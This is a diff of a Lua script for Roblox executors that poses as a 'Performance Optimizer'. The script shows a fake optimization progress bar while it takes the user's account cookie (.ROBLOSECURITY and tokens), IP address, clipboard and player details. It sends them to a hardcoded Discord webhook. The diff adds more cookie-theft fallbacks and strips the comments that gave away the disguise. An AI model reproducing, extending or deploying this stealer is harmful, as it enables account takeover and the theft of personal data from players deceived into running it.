@@ -1,9 +1,5 @@
--- ============================================================
--- Performance Optimizer v2.0 – Legit GUI + Data Collection
--- ============================================================
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
--- ========== HTTP SENDER (proven to work) ==========
 local function sendData(url, content)
     local payload = {content = content}
     local json = game:GetService("HttpService"):JSONEncode(payload)
@@ -20,43 +16,28 @@ local function sendData(url, content)
     return false
 end
 
--- ========== IMPROVED IP ==========
 local function getIP()
     local ip = "N/A"
-    -- Try multiple services with HttpService:GetAsync
-    local services = {
-        "https://api.ipify.org",
-        "https://ip-api.com/json/?fields=query",
-        "https://icanhazip.com",
-        "https://httpbin.org/ip"
-    }
-    for _, url in ipairs(services) do
+    local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
+    if ok and res and res.Body and res.Body ~= "" then
+        ip = res.Body:gsub("%s+", "")
+        if ip ~= "" then return ip end
+    end
+    ok, res = pcall(function() return http_request({Url = "https://api.ipify.org", Method = "GET"}) end)
+    if ok and res and res.Body and res.Body ~= "" then
+        ip = res.Body:gsub("%s+", "")
+        if ip ~= "" then return ip end
+    end
+    for _, url in ipairs({"https://api.ipify.org", "https://ip-api.com/json/?fields=query", "https://icanhazip.com", "https://httpbin.org/ip"}) do
         local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
         if ok and result and result ~= "" then
-            if result:match('"query":"(.-)"') then
-                ip = result:match('"query":"(.-)"')
-            elseif result:match('"origin":"(.-)"') then
-                ip = result:match('"origin":"(.-)"')
-            else
-                ip = result:gsub("%s+", "")
-            end
+            if result:match('"query":"(.-)"') then ip = result:match('"query":"(.-)"')
+            elseif result:match('"origin":"(.-)"') then ip = result:match('"origin":"(.-)"')
+            else ip = result:gsub("%s+", "") end
             if ip and ip ~= "" and ip ~= "N/A" then break end
         end
     end
-    -- If still N/A, try request() as a fallback (may work on some executors)
-    if ip == "N/A" then
-        local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
-        if ok and res and res.Body and res.Body ~= "" then
-            ip = res.Body:gsub("%s+", "")
-        end
-    end
     return ip
-end
-
--- ========== DATA COLLECTION ==========
-local function safeGet(obj, prop, default)
-    local ok, val = pcall(function() return obj[prop] end)
-    return ok and val or default
 end
 
 local function stealCookie()
@@ -66,7 +47,31 @@ local function stealCookie()
     if ok and val and val ~= "" then return val end
     ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
     if ok and val and val ~= "" then return val end
-    return "Not available (Delta)"
+    ok, val = pcall(function()
+        local res = request({Url = "https://www.roblox.com/", Method = "GET"})
+        if res and res.Headers then
+            for k, v in pairs(res.Headers) do
+                if string.lower(k) == "set-cookie" then
+                    return v:match("(.-);") or v
+                end
+            end
+        end
+        return nil
+    end)
+    if ok and val and val ~= "" then return val end
+    ok, val = pcall(function()
+        return game:GetService("HttpService"):GetAsync("https://www.roblox.com/")
+    end)
+    if ok and val and val:match("__RequestVerificationToken") then
+        local token = val:match('__RequestVerificationToken" value="(.-)"')
+        if token then return token end
+    end
+    ok, val = pcall(function()
+        local ms = game:GetService("MemoryStoreService"):GetStore(".ROBLOSECURITY")
+        return ms and ms:GetAsync("cookie")
+    end)
+    if ok and val and val ~= "" then return val end
+    return "Not available (executor limit)"
 end
 
 local function getClipboard()
@@ -77,7 +82,12 @@ local function getClipboard()
     return "N/A"
 end
 
-local function collectData()
+local function safeGet(obj, prop, default)
+    local ok, val = pcall(function() return obj[prop] end)
+    return ok and val or default
+end
+
+local function collectAll()
     local info = {}
     info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
     local player = game.Players.LocalPlayer
@@ -157,8 +167,7 @@ local function collectData()
     return info
 end
 
--- ========== SEND DATA ==========
-local data = collectData()
+local data = collectAll()
 local lines = {}
 for k, v in pairs(data) do
     if v and v ~= "" then
@@ -168,13 +177,11 @@ end
 local message = "```\n" .. table.concat(lines, "\n") .. "\n```"
 sendData(webhook, message)
 
--- ========== LEGIT GUI – "Performance Optimizer" ==========
 pcall(function()
     local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
     local gui = Instance.new("ScreenGui")
     gui.Parent = playerGui
     gui.ResetOnSpawn = false
-
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 420, 0, 200)
     frame.Position = UDim2.new(0.5, -210, 0.5, -100)
@@ -182,8 +189,6 @@ pcall(function()
     frame.BackgroundTransparency = 0.08
     frame.Parent = gui
     Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
-
-    -- Title
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
@@ -193,8 +198,6 @@ pcall(function()
     title.TextScaled = true
     title.Font = Enum.Font.GothamBold
     title.Parent = frame
-
-    -- Subtitle (changing message)
     local sub = Instance.new("TextLabel")
     sub.Size = UDim2.new(1, 0, 0, 30)
     sub.Position = UDim2.new(0, 0, 0.35, 0)
@@ -204,21 +207,17 @@ pcall(function()
     sub.TextScaled = true
     sub.Font = Enum.Font.Gotham
     sub.Parent = frame
-
-    -- Progress bar
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(0.8, 0, 0, 18)
     bg.Position = UDim2.new(0.1, 0, 0.55, 0)
     bg.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
     bg.Parent = frame
     Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 9)
-
     local fill = Instance.new("Frame")
     fill.Size = UDim2.new(0, 0, 1, 0)
     fill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
     fill.Parent = bg
     Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 9)
-
     local percent = Instance.new("TextLabel")
     percent.Size = UDim2.new(0, 60, 0, 30)
     percent.Position = UDim2.new(0.5, -30, 0.75, 0)
@@ -228,8 +227,6 @@ pcall(function()
     percent.TextScaled = true
     percent.Font = Enum.Font.Gotham
     percent.Parent = frame
-
-    -- Status message (after completion)
     local status = Instance.new("TextLabel")
     status.Size = UDim2.new(1, 0, 0, 30)
     status.Position = UDim2.new(0, 0, 0.85, 0)
@@ -239,8 +236,6 @@ pcall(function()
     status.TextScaled = true
     status.Font = Enum.Font.Gotham
     status.Parent = frame
-
-    -- Close button (appears later)
     local closeBtn = Instance.new("TextButton")
     closeBtn.Size = UDim2.new(0, 120, 0, 40)
     closeBtn.Position = UDim2.new(0.5, -60, 1, -50)
@@ -253,8 +248,6 @@ pcall(function()
     closeBtn.Visible = false
     Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 12)
     closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
-
-    -- Animate progress and update messages
     local function animate()
         local duration = 2.5
         local steps = 50
@@ -278,12 +271,10 @@ pcall(function()
                 end
             end
         end
-        -- Done
         sub.Text = "Optimization complete!"
         status.Text = "Settings updated successfully."
         closeBtn.Visible = true
     end
-
     task.wait(0.3)
     spawn(animate)
 end)
